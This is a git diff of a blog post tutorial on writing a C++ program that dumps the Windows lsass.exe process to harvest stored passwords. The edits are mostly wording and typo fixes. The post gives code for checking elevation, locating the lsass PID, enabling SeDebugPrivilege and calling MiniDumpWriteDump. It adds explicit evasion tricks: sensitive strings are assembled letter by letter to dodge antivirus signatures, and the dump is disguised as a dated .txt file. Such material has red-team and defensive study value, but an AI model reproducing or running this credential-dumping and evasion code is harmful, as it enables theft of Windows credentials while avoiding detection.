@@ -1,17 +1,35 @@
 ---
 layout: post
-title: Dumping Lsass with style and C++
+title: Dumping Lsass with C++ (and style)
 excerpt_separator: <!--more-->
 ---
 
-Dumping the Lsass process to get the passwords stored in memory in a Windows machine is one of the most common uses of Mimikatz. However, there are stealthier methods to do this, such as using custom code. Doing so, we can customize the dump file name, for example using the hostname and date in the name or using seemingly harmless extensions such as ".txt"
+Dumping the Lsass process to get the passwords stored in memory in a Windows machine is one of the most common uses of Mimikatz. However, there are stealthier methods to do this, such as using custom code. Doing so, we can customize the dump file name, using the hostname and date as name and harmless extensions such as ".txt" instead of ".dmp".
 
 <!--more-->
 
 
-## TL;DR
+## Goal
 
-We will use C++ to create a program that dumps the lsass.exe process locally with the function [MiniDumpWriteDump()](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump). Without input arguments it creates a dump file with the hostname and date as name and the ".txt" extension (*hostname_DD-MM-YYYY-HHMM.txt*); or uses the first input argument as path and name for the file.  We will not use the "lsass" or "SeDebugPrivilege" string and will try to use the minimum the "minidump" string. The final program is in [this link](https://github.com/ricardojoserf/LsassDumper).
+We will use C++ to create a program that dumps the lsass.exe process in the stealthier way we can.  
+
+Without input arguments it creates a dump file with the hostname and date as name and the ".txt" extension (*hostname_DD-MM-YYYY-HHMM.txt*). With input arguments it will use the first one as path for the file.  
+
+To try to be stealthier, we will not use the "lsass" or "SeDebugPrivilege" strings and will try not to use the "minidump" string when possible. The final program is in [this link](https://github.com/ricardojoserf/LsassDumper).
+
+<br><br>
+
+# Code
+
+To reach our goal, we will create a code that will:
+
+- Check we are running an elevated process
+- Get the lsass.exe PID
+- Generate the file name or get it from the input arguments
+- Create the output file with the correct name
+- Enable the SeDebugPrivilege privilege
+- Get a handle to the lsass.exe process
+- Dump the process
 
 
 ## Main function
@@ -20,7 +38,7 @@ First we need to check if the process is running with administrative privileges,
 
 ```cpp
 if (!IsElevatedProcess()) {
-	wcout << "[-] Error: Execute with administrative provileges." << endl;
+	wcout << "[-] Error: Execute with administrative privileges." << endl;
 	return 1;
 }
 ```
@@ -46,7 +64,6 @@ else {
 	string hostname = getHostname();
 	filename = getFileName(hostname);
 }
-how-to-convert-stdstring-to-lpcwstr-in-c-unicode
 std::wstring stemp = std::wstring(filename.begin(), filename.end());
 LPCWSTR pointer_filename = stemp.c_str();
 ```
@@ -83,12 +100,13 @@ if (isDumped) {
 }
 ```
 
+<br><br>
 
 ## Other functions
 
-### Check Elevated Process 
+#### Check Elevated Process 
 
-For checking if the program is running as an elevated process we will use the following function ([code source](https://stackoverflow.com/questions/11491933/openprocess-returns-null-every-time-in-c)):
+For checking if the program is running as an elevated process we will use the following function ([source](https://stackoverflow.com/questions/11491933/openprocess-returns-null-every-time-in-c)):
 
 ```cpp
 BOOL IsElevatedProcess()
@@ -113,7 +131,7 @@ BOOL IsElevatedProcess()
 ```
 
 
-### Get Lsass Process ID
+#### Get Lsass Process ID
 
 For getting the lsass.exe process ID (or PID) we will use the following function (based on this [code](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass)). To avoid using the string "lsass.exe" we will concatenate each letter of the string creating *processname_str*:
 
@@ -145,7 +163,7 @@ DWORD getProcessPid()
 }
 ```
 
-### Set the SeDebugPrivilege privilege
+#### Set the SeDebugPrivilege privilege
 
 To interact with the process we will need not only run the process with administrative privileges but also the SeDebugPrivilege privilege. For that, we will use the following method (based on [this snippet](https://www.unknowncheats.me/forum/1872353-post36.html)). To avoid using the string "SeDebugPrivilege" we will concatenate each letter of the string creating *privilegename_str*: 
 
@@ -198,11 +216,9 @@ EXIT:
 ```
 
 
+#### Create output file name
 
-
-### Create output file name
-
-In case of not using input parameters, we will generate a file name with the format *hostname_DD-MM-YYYY-HHMM.txt*. For getting the hostname of the computer we will use the [GetComputerName](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea) method using the function getHostname()([code source](https://www.youtube.com/watch?v=Z7ahuHV5eXY&ab_channel=RabieHammoud)):
+In case of not using input parameters, we will generate a file name with the format *hostname_DD-MM-YYYY-HHMM.txt*. For getting the hostname of the computer we will use the [GetComputerName](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea) method using the function getHostname()([source](https://www.youtube.com/watch?v=Z7ahuHV5eXY&ab_channel=RabieHammoud)):
 
 ```cpp
 string getHostname() {
@@ -216,7 +232,9 @@ string getHostname() {
 ```
 
 Then we call the getFileName() function with the hostname to create the final file name. We create a string with the extension we will use and get the current time and store it in *timePtr*.
+
 From [the documentation of the tm struct](https://www.cplusplus.com/reference/ctime/tm/) we get the fields we want, in this case the day (*tm_mday*), month (*tm_mon*, we add 1 because it represents the months from January from 0 to 11), year (*tm_year*, we add 1900 because it represents the years from that date), hour (*tm_hour*) and minutes (*tm_minutes*, we append a "0" in case it is less than 10).
+
 To create the final string we will use a Stringstream, *filenamestream*, to concatenate the strings and integers. In case you want to customize the file name, this is the object you should change.
 
 
@@ -250,7 +268,7 @@ string getFileName(string hostname) {
 }
 ```
 
-
+<br><br>
 
 ## Final script
 
@@ -409,7 +427,7 @@ string getFileName(string hostname) {
 int main(int argc, char** argv) {
 	// Check elevated process
 	if (!IsElevatedProcess()) {
-		wcout << "[-] Error: Execute with administrative provileges." << endl;
+		wcout << "[-] Error: Execute with administrative privileges." << endl;
 		return 1;
 	}
 
